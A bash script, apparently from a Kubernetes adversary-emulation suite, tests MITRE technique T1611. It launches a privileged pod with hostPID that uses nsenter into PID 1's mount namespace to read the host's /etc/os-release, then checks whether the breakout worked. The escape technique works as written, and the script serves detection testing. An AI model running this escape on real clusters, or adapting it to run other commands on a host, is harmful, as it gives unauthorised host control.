#!/usr/bin/env bash
# T1611: Escape to Host via nsenter container escape
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
source "${SCRIPT_DIR}/common.sh"

log_header "Emulation T1611: Escape to Host"

ESCAPE_POD="atomic-nsenter-escape-pod"

# 1. Clean up any prior pod
kubectl delete pod "${ESCAPE_POD}" -n "${TARGET_NAMESPACE}" --ignore-not-found >/dev/null 2>&1 || true

# 2. Record telemetry
log_telemetry "T1611" "${ESCAPE_POD}" "nsenter --mount=/proc/1/ns/mnt host breakout"

# 3. Execute escape pod (hostPID: true, privileged: true)
log_info "Launching privileged hostPID escape pod to read host '/etc/os-release'..."
OUTPUT="$(kubectl run "${ESCAPE_POD}" -n "${TARGET_NAMESPACE}" \
  --restart=Never --attach --rm -i --image=alpine:latest \
  --overrides='{"spec":{"hostPID": true, "containers":[{"name":"escape","image":"alpine:latest","command":["nsenter","--mount=/proc/1/ns/mnt","--","cat","/etc/os-release"],"stdin":true,"tty":false,"securityContext":{"privileged":true}}]}}' 2>/dev/null || true)"

echo "${OUTPUT}"

# 4. Assert outcome: Host OS release file was read from host mount namespace
if echo "${OUTPUT}" | grep -qE "Ubuntu|Linux|NAME="; then
    log_success "T1611 emulation succeeded (Escaped container namespace to host filesystem)."
else
    log_error "T1611 emulation failed: Unable to verify host breakout output."
    exit 1
fi
